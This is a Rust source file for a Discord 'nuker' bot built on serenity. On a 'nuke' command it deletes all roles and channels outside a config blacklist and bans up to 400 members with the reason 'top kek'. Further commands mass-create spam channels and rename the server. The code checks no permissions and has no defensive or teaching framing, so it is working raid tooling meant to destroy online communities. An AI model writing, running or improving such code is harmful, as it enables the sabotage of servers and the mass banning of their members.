use serenity::cache::{Cache, Settings};
use std::env;

mod config;
use config::*;

use serenity::{
    async_trait,
    model::{channel::Message, gateway::Ready},
    prelude::*,
};

struct Handler {
    conf: Config,
}

fn parse_cmd(msg: String) -> String {
    msg.split(" ").collect::<Vec<&str>>()[0].into()
}

fn parse_args(msg: String) -> Vec<String> {
    let args: Vec<&str> = msg.split(" ").collect();
    let mut result = Vec::new();
    for i in args.into_iter().skip(1) {
        result.push(i.to_string());
    }
    result
}

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        let guilds = ctx.cache.guilds().await;

        println!("Guilds in the Cache: {}", guilds.len());

        let mut settings = Settings::new();
        settings.max_messages(10);

        let cache = Cache::new_with_settings(settings);

        let mut guild = match msg.guild_id {
            Some(v) => v,
            None => return,
        };
        let result = match parse_cmd(msg.content.to_owned()).as_str() {
            "nuke" => {
                if let Some(mut guild) = cache.guild(guild).await {
                    println!("Guild name: {}", guild.name);
                    for (id, value) in &mut guild.roles {
                        if self.conf.blacklist_roles.contains(&id.0) {
                            continue;
                        }
                        let _ = match value.delete(&ctx.http).await {
                            Ok(v) => v,
                            Err(e) => println!("failed to delete role: {value} due to  {e}"),
                        };
                    }
                    for (id, value) in &guild.channels {
                        if self.conf.blacklist_channels.contains(&id.0) {
                            continue;
                        }
                        let _ = match value.delete(&ctx.http).await {
                            Ok(v) => println!("deleted channel with id: {v}"),
                            Err(e) => {
                                println!("failed to delete channel {value} due to {e}");
                                continue;
                            }
                        };
                    }

                    let members = match guild.members(&ctx.http, Some(400), None).await {
                        Ok(v) => v,
                        Err(_) => return,
                    };

                    for user in members {
                        if self.conf.blacklist_users.contains(&user.user.id.0) {
                            continue;
                        }
                        println!("banning {}", user.user.name);
                        let _ = user.ban_with_reason(&ctx.http, 7, "top kek").await;
                    }
                }
                ":sunglasses:"
            }
            "c" => {
                let args = parse_args(msg.content);
                if args.len() < 1 {
                    return;
                }
                let amt: u16 = match args[1].parse() {
                    Ok(v) => v,
                    Err(_) => return,
                };
                let name = match args.len() {
                    2.. => args[2].to_owned(),
                    _ => format!("top kek"),
                };
                if let Some(guild) = cache.guild(guild).await {
                    println!("creating channels in {} : param : {:?}", guild.name, args);
                    for _ in 1..=amt {
                        match guild
                            .create_channel(&ctx.http, |c| c.name(name.clone()))
                            .await
                        {
                            Ok(_) => {}
                            Err(e) => println!("failed to create channel {name} due to {e}"),
                        };
                    }
                }
                return;
            }
            "rename" => {
                let args = parse_args(msg.content);
                if args.len() < 1 {
                    return;
                }
                let _ = guild.edit(&ctx.http, |x| x.name(args[0].clone())).await;
                return;
            }
            "ping" => "Pong",
            _ => return,
        };
        if let Err(why) = msg
            .channel_id
            .say(&ctx.http, format!("{:#?}", result))
            .await
        {
            println!("Error sending message: {:?}", why);
        }
    }

    async fn ready(&self, _: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);
    }
}

#[tokio::main]
async fn main() {
    let mut args: Vec<String> = env::args().collect();
    let path = args[0].clone();
    args.remove(0);

    if args.contains(&"check".to_string()) {
        let _ = Config::load();
        std::process::exit(0);
    }

    if args.contains(&"reset".to_string()) {
        match Config::reset() {
            Ok(_) => println!("created new config at {path}/.config"),
            Err(e) => println!("failed to reset due to {e}"),
        };
        std::process::exit(0);
    }

    let config = Config::load();
    let token = &config.token;

    let mut client = Client::builder(&token)
        .event_handler(Handler {
            conf: config.clone(),
        })
        .await
        .expect("Err creating client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}
